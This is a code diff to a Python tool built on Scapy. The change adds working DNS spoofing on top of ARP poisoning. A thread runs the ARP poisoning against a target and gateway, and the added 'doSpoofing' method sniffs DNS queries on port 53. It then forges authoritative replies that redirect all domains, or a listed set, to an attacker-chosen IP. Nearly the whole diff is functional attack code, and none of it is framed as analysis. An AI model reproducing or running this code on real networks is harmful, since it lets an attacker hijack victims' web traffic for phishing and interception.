@@ -1,5 +1,6 @@
 from scapy.all import *
 from arp import arp
+import threading
 
 
 class dnsfinal():
@@ -69,6 +70,40 @@ class dnsfinal():
     def startProcess(self):
         arpprocess = arp(self.interface)
         arpprocess.setInput(self.ip_range, self.ips_used, self.defaultGateway, self.target, self.ownMAC, "y")
-        arpprocess.startProcess()
-        
+        #arpprocess.startProcess()
+        proc_thread = None
+        proc_thread = threading.Thread(target=arpprocess.startProcess)
+        proc_thread.daemon = True
+        proc_thread.start()
+
+        print("DNS sniffing has started")
+        while True:
+            sniff(filter="port 53", prn=lambda packet: self.doSpoofing(packet), iface=self.interface)
+
+    #method which does the DNS spoofing of a packet
+    def doSpoofing(self, packet):
+        print("I got one!! ")
+        if (packet.haslayer(DNS)) and (packet[DNS].qr == 0):
+            #Case the user entered specific websites to spoof
+            
+            should_be_spoofed = False
+            if(len(self.url) > 0):
+                for domain in self.url:
+                    if(domain in packet[DNS].qd.qname):
+                        should_be_spoofed = True
+                    
+            #Case all URLs should be spoofed or it was in the list of URLs to spoof
+            if(len(self.url) == 0 or should_be_spoofed):
+                #create fake response packet
+                spoofedETHER = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
+                spoofedIP = IP(src=packet[IP].dst, dst=packet[IP].src)
+                spoofedUDP = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
+                spoofedDNSRR = DNSRR(rrname=packet[DNS].qd.qname, rdata=self.ip_website)
+                spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=spoofedDNSRR)
+                #send the packet
+                sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=self.interface)
+                print("we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website))
+        #we intercepted a packet that was not ment to be modified, so we simply have to redirect it        
+        else:
+            print(self.defaultGateway)
         
